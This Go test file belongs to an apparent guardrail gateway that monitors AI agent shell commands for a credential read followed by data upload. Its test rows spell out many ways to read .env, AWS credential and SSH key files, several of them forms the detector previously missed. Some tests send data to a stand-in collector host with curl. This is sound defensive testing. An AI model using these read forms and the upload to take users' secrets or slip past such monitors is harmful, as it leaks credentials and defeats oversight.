// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
	"github.com/defenseclaw/defenseclaw/internal/guardrail"
)

// g0344Folder is a work folder with the given files.
// g0684Files is the project of the GAP-0684 rows.
var g0684Files = []string{".env", "sub/.env", "deploy/id_ed25519", "src/a.go", ".github/workflows/ci.yml"}

// g0344Place is the command of a row in dir and the hook's folder: @P is
// dir, and a leading "@up " puts the hook in the folder above it.
//
// @P is one single-quoted shell word with forward slashes:
//   - t.TempDir names the folder after the subtest and keeps "(" and ")",
//     so the C19 folder holds "(GAP-0683_stays_exact)"; unquoted, that is a
//     shell syntax error, and the row read nothing whatever rg would read;
//   - an unquoted C:\Users\... word loses its backslashes to a POSIX shell
//     on Windows (Git Bash, the shell Claude Code runs there): C:Users..., a
//     folder that is not there, so no side (rel, base or head) read anything.
//
// On Linux and macOS ToSlash leaves dir as it is.
func g0344Place(cmd, dir string) (string, string) {
	hook := dir
	if rest, ok := strings.CutPrefix(cmd, "@up "); ok {
		cmd, hook = rest, filepath.Dir(dir)
	}
	return strings.ReplaceAll(cmd, "@P", "'"+filepath.ToSlash(dir)+"'"), hook
}

// g0684WindowsUnsure is the read of a row whose rg runs after a cd to a
// drive folder (C:/...): the working folder tracking places only POSIX
// folders, so on Windows rg's folder is not known exactly and every glob
// counts, the base behaviour (rgWorkingFolder); elsewhere the row reads
// what real rg reads.
var g0684WindowsUnsure = runtime.GOOS == "windows"

func g0344Folder(t *testing.T, files ...string) string {
	t.Helper()
	dir := t.TempDir()
	if strings.ContainsRune(dir, '\'') {
		t.Fatalf("%q: a quote in the folder breaks the single-quoted @P", dir)
	}
	for _, f := range files {
		p := filepath.Join(dir, filepath.FromSlash(f))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("x\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

type g0344Row struct {
	id, cmd string
	files   []string
	read    bool
}

// The rows of substrate-1:GAP-0344 (P02, P04, P05) and GAP-0349 (Q20-Q25):
// each reads a credentials file and starts the chain; the controls next to
// them read none and start nothing. Q27 (a script's file argument) stays a
// non-read by the rel-1-0-10:GAP-1030 ruling (TestGAP1030NonReadWords...).
func g0344Rows() []g0344Row {
	return []g0344Row{
		// GAP-0344: a recursive search reads the folder below it, and the
		// working folder when it names none.
		{"P02 grep -r, the file one level down", "grep -r KEY .", []string{"config/.env", "main.go"}, true},
		{"P02b grep -r, two levels down", "grep -rn KEY src", []string{"src/svc/api/.env", "src/main.go"}, true},
		{"P04 grep -r with no folder", "grep -r KEY", []string{".env", "main.go"}, true},
		// P05 as filed ("rg default") read no .env: ripgrep skips hidden
		// files by default. The read forms are --hidden, -., -uu and a glob
		// override (T6 ruling 2026-11-18, gap note on GAP-0344).
		{"P05 rg --hidden with no folder", "rg --hidden KEY", []string{".env", "main.go"}, true},
		{"P05b rg -uu, the file one level down", "rg -uu KEY", []string{"src/.env", "src/main.go"}, true},
		{"P05c rg -. with no folder", "rg -. KEY", []string{"src/.env"}, true},
		{"P05d rg naming the hidden file", "rg KEY .env", []string{".env"}, true},
		{"P05e rg with a glob matching .env", "rg -g '*.env' KEY", []string{"src/.env"}, true},
		{"P05f rg naming a hidden folder", "rg KEY .aws", []string{".aws/credentials"}, true},
		// GAP-0671: a --type-add type selected with -t whitelists its globs
		// past the hidden rule, as -g does.
		{"P05g rg --type-add type selecting .env", "rg --type-add 'e:*.env' -te KEY", []string{".env", "main.go"}, true},
		{"P05h rg --type-add type with a folder", "rg --type-add 'e:*.env' -te KEY .", []string{"src/.env"}, true},
		{"P04b grep -r with no folder, the file one level down", "grep -r KEY", []string{"config/.env"}, true},
		{"C01 grep -r in a folder without one", "grep -rn TODO .", []string{"src/main.go", "docs/a.md"}, false},
		{"C02 grep -r with no folder, none there", "grep -r KEY", []string{"main.go", "pkg/a.go"}, false},
		{"C03 rg fed by a pipe reads its input", "cat main.go | rg KEY", []string{".env", "main.go"}, false},
		{"C04 grep without -r reads no folder", "grep KEY main.go", []string{".env", "main.go"}, false},
		{"C05 the walk skips node_modules", "grep -r KEY .", []string{"node_modules/pkg/.env", "main.go"}, false},
		// ripgrep's default: no hidden file or folder is read (P2-2 of the
		// round-1 review: rg TODO with a nested .env started the chain).
		{"C06 rg default skips a hidden file", "rg KEY", []string{".env", "main.go"}, false},
		{"C07 rg default skips a nested hidden file", "rg TODO", []string{"src/.env", "src/a.go"}, false},
		{"C08 rg default skips a hidden folder", "rg TODO .", []string{".aws/credentials", "a.go"}, false},
		{"C09 rg -u alone still skips hidden files", "rg -u TODO", []string{"src/.env"}, false},
		{"C15 rg with a glob that cannot match .env", "rg -g '*.go' TODO", []string{"src/.env", "src/a.go"}, false},
		// GAP-0683: an include glob reads only what it selects (real rg 14.1.0
		// reads no .env for any of these), in a project with a .env.
		{"C15b rg -g '*.yml' with a .env", "rg -g '*.yml' TODO", []string{".env", ".github/workflows/ci.yml"}, false},
		{"C15c rg -g '*.toml' with a .env", "rg -g '*.toml' TODO", []string{".env", "pyproject.toml"}, false},
		{"C15d rg -g '*.key' with a .env", "rg -g '*.key' TODO", []string{".env", "src/a.go"}, false},
		// substrate-1:GAP-0689: a mover body that may return before its cd
		// leaves rg in the hook's folder too, so the glob is not anchored at
		// the cd's folder alone.
		{"G0689a mover may return before cd /", "f(){ test -e .env && return; cd /; }; f && rg -g '/.env' KEY @P", []string{".env", "src/a.go"}, true},
		{"G0689b return 0 before cd /tmp", "f(){ [ -e .env ] && return 0; cd /tmp; }; f && rg -g '/.env' KEY @P", []string{".env", "src/a.go"}, true},
		{"G0689c a .git test, deploy glob", "f(){ test -d .git && return; cd /; }; f && rg -g 'deploy/*' KEY @P", []string{".git/HEAD", "deploy/id_ed25519"}, true},
		{"G0689d bare return first", "f(){ return; cd /; }; f && rg -g '/.env' KEY @P", []string{".env", "src/a.go"}, true},
		{"C0689 return 1 cannot pass the &&", "f(){ test -e .nope && return 1; cd @P/src; }; f && rg -g '/.env' KEY @P/src", []string{".env", "src/a.go"}, false},
		{"C15e rg -g '*.json' with a .env", "rg -g '*.json' TODO", []string{".env", "package.json"}, false},
		{"C15f rg -g '*.{ts,tsx}' with a .env", "rg -g '*.{ts,tsx}' TODO", []string{".env", "web/app.tsx"}, false},
		{"C15g rg -g 'src/**' with a .env", "rg -g 'src/**' TODO", []string{".env", "src/a.go"}, false},
		{"C15h rg -g '*.ts' -g '*.json' with a .env", "rg -g '*.ts' -g '*.json' TODO", []string{".env", "package.json", "src/b.ts"}, false},
		{"P05i rg with a brace glob matching .env", "rg -g '{.env,*.go}' KEY", []string{".env", "src/a.go"}, true},
		{"C16 rg --no-hidden after --hidden", "rg --hidden --no-hidden TODO", []string{"src/.env"}, false},
		{"C17 rg --type-add of an ordinary type", "rg --type-add 'g:*.go' -tg KEY", []string{".env", "a.go"}, false},
		{"C18 rg -T excludes a type, reads nothing hidden", "rg --type-add 'e:*.env' -Te KEY", []string{".env", "a.go"}, false},
		// GAP-0684: rg matches its globs from the folder a cd, pushd or popd
		// moved it to (real rg 14.1.0 reads the file in every read row,
		// actionfacts TestGAP0684RgWorkingFolderLive). In cmd, @P is the
		// project; "@up " runs the call with the hook in the folder above it.
		{"P06a cd P/sub then rg -g '/.env'", "cd @P/sub && rg -g '/.env' KEY @P/sub", g0684Files, true},
		{"P06b cd P then rg -g '/.env'", "@up cd @P && rg -g '/.env' KEY @P", g0684Files, true},
		{"P06c cd P then rg -g 'deploy/*'", "@up cd @P && rg -g 'deploy/*' KEY @P", g0684Files, true},
		{"P06d pushd P then rg -g 'deploy/*'", "@up pushd @P >/dev/null && rg -g 'deploy/*' KEY @P", g0684Files, true},
		{"P06e a subshell cd then rg -g '/deploy/**'", "@up (cd @P && rg -g '/deploy/**' KEY @P)", g0684Files, true},
		{"P06f cd - then rg -g '/.env'", "@up cd @P && cd / && cd - >/dev/null && rg -g '/.env' KEY @P", g0684Files, true},
		{"P06g popd then rg -g '/.env'", "@up pushd @P >/dev/null && pushd / >/dev/null && popd >/dev/null && rg -g '/.env' KEY @P", g0684Files, true},
		{"P06h cd to a variable then rg -g '/.env'", `@up D=@P; cd "$D" && rg -g '/.env' KEY @P`, g0684Files, true},
		{"P06i CDPATH then rg -g '/.env'", "@up export CDPATH=@P; cd sub >/dev/null && rg -g '/.env' KEY @P/sub", g0684Files, true},
		{"C19 cd P then rg -g '*.yml' (GAP-0683 stays exact)", "@up cd @P && rg -g '*.yml' TODO @P", g0684Files, g0684WindowsUnsure},
		// GAP-0349: read forms the record missed.
		{"Q20 a for-loop variable", `for f in .env; do cat "$f"; done`, []string{".env"}, true},
		{"Q21 perl -e reading its argument with <>", `perl -e 'print while <>' .env`, []string{".env"}, true},
		{"Q22 python -c reading sys.argv", `python3 -c 'import sys; print(open(sys.argv[1]).read())' .env`, []string{".env"}, true},
		{"Q23 find -name glob matching a dotfile", `find . -name '*.env' -exec cat {} \;`, []string{".env"}, true},
		{"Q24 ruby -e ARGF.read", `ruby -e 'puts ARGF.read' .env`, []string{".env"}, true},
		{"Q25 python with -W before -c", `python3 -W ignore -c "print(open('.env').read())"`, []string{".env"}, true},
		{"C10 python -c not reading its arguments", `python3 -c 'print(1)' .env`, []string{".env"}, false},
		{"C11 a script with an ordinary argument", "python3 show.py input.txt", []string{"input.txt", "show.py"}, false},
		{"C12 for-loop over ordinary files", `for f in a.go b.go; do cat "$f"; done`, []string{"a.go", "b.go"}, false},
		{"C13 shell glob *.env (shell skips dotfiles)", "cat src/*.env", []string{"src/.env"}, false},
		{"C14 find -name of an ordinary glob", `find . -name '*.go' -exec cat {} \;`, []string{".env", "a.go"}, false},
	}
}

// TestGAP0344GAP0349CredentialReadForms is substrate-1:GAP-0344 and
// GAP-0349 at the action facts the chain reads.
func TestGAP0344GAP0349CredentialReadForms(t *testing.T) {
	for _, row := range g0344Rows() {
		t.Run(row.id, func(t *testing.T) {
			cmd, hook := g0344Place(row.cmd, g0344Folder(t, row.files...))
			facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: cmd, CWD: hook, ActiveHome: t.TempDir()})
			if got := credentialFileContentRead(facts); got != row.read {
				t.Fatalf("%q in %v: credentials read = %v, want %v (status %s, private %v)",
					row.cmd, row.files, got, row.read, facts.Parse.Status, facts.CredentialPathReads())
			}
			if caps := facts.CredentialPathReadCaps(context.Background()); caps.Any() {
				t.Fatalf("%q: TRUNCATED %v in a small folder", row.cmd, caps)
			}
		})
	}
}

// The same rows through a host hook: a read row then an upload completes
// the chain; a control row does not. Q23 (find -exec) completes it since the
// find child twin no longer records over the facts of the call itself.
func TestGAP0344GAP0349ChainOnTheHook(t *testing.T) {
	installCorrelationHMACForTest(t)
	handler := hostClaudeHookHandlerForTest(t, "default")
	for i, row := range g0344Rows() {
		t.Run(row.id, func(t *testing.T) {
			cmd, dir := g0344Place(row.cmd, g0344Folder(t, row.files...))
			session := "g0344-" + strconv.Itoa(i)
			ev := claudeToolEvent("PreToolUse", session, "read", cmd)
			ev["cwd"] = dir
			callAgentHookForTest(t, handler, ev)
			res := claudeToolResult("PostToolUse", session, "read")
			res["cwd"] = dir
			callAgentHookForTest(t, handler, res)
			up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
			up["cwd"] = dir
			got := callAgentHookForTest(t, handler, up)
			if chain := slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress); chain != row.read {
				t.Fatalf("%q then an upload: chain = %v, want %v (rules %v)", row.cmd, chain, row.read, got.RuleIDs)
			}
		})
	}
}

// g0344BigTree is a tree of more folders than the walk reads (4,096),
// with files.
func g0344BigTree(t *testing.T, files ...string) string {
	t.Helper()
	for i := 0; i < 4200; i++ {
		files = append(files, filepath.Join("d", string(rune('a'+i%26)), "f"+strconv.Itoa(i), "x.go"))
	}
	return g0344Folder(t, files...)
}

// A walk cut at its folder bound is no cap of the resolve (no TRUNCATED on
// the call): it adds the chain's file-unknown read, and a file the walk
// found before the cut still counts.
func TestGAP0344WalkCut(t *testing.T) {
	dir := g0344BigTree(t, ".env")
	facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: "grep -r KEY .", CWD: dir, ActiveHome: t.TempDir()})
	if caps := facts.CredentialPathReadCaps(context.Background()); caps.Any() {
		t.Fatalf("a cut walk is a cap of the resolve: %v", caps)
	}
	if !credentialFileContentRead(facts) {
		t.Fatal("the .env the walk found before the cut does not count")
	}
	reads := facts.CredentialPathReads()
	if !slices.ContainsFunc(reads, func(p actionfacts.PathFact) bool { return p.Value == "" }) ||
		!slices.ContainsFunc(reads, func(p actionfacts.PathFact) bool { return filepath.Base(p.Value) == ".env" }) {
		t.Fatalf("reads %v: want the .env and the file-unknown read", reads)
	}
}

// A read-only search in a tree over the walk bound with no credentials
// file keeps the parent's verdict, allow, in the default and the strict
// pack: no ACTION-COMPOUND-LIMIT (round-1 review P2-1, T6 ruling
// 2026-11-18). The cut walk marks only the chain, at its unknown tier: a
// later upload joins it.
func TestGAP0344WalkCutIsNoVerdict(t *testing.T) {
	installCorrelationHMACForTest(t)
	dir := g0344BigTree(t)
	for _, pack := range []string{"default", "strict"} {
		handler := hostClaudeHookHandlerForTest(t, pack)
		for i, cmd := range []string{"grep -rn TODO .", "rg TODO", "grep -r KEY"} {
			t.Run(pack+" "+cmd, func(t *testing.T) {
				session := "g0344cut-" + pack + "-" + strconv.Itoa(i)
				ev := claudeToolEvent("PreToolUse", session, "read", cmd)
				ev["cwd"] = dir
				got := callAgentHookForTest(t, handler, ev)
				if got.Action != "allow" || slices.Contains(got.RuleIDs, "ACTION-COMPOUND-LIMIT") {
					t.Fatalf("%q in a %d-folder tree: action %q rules %v, want allow", cmd, 4200, got.Action, got.RuleIDs)
				}
				res := claudeToolResult("PostToolUse", session, "read")
				res["cwd"] = dir
				callAgentHookForTest(t, handler, res)
				up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
				up["cwd"] = dir
				got = callAgentHookForTest(t, handler, up)
				if !slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress) {
					t.Fatalf("%q in a cut walk then an upload: no chain at the unknown tier (rules %v)", cmd, got.RuleIDs)
				}
			})
		}
	}
}

// The walk reuse is keyed on hidden: a grep -r walk made just before is
// not reused for an rg without --hidden.
func TestGAP0344WalkReuseKeepsHidden(t *testing.T) {
	dir := g0344Folder(t, "src/.env", "src/a.go")
	in := actionfacts.Input{Tool: "exec", Command: "grep -r KEY .", CWD: dir, ActiveHome: t.TempDir()}
	if !credentialFileContentRead(actionfacts.Analyze(in)) {
		t.Fatal("grep -r: the .env is not read")
	}
	in.Command = "rg KEY ."
	if credentialFileContentRead(actionfacts.Analyze(in)) {
		t.Fatal("rg reuses the walk of grep -r: the hidden .env counts")
	}
}
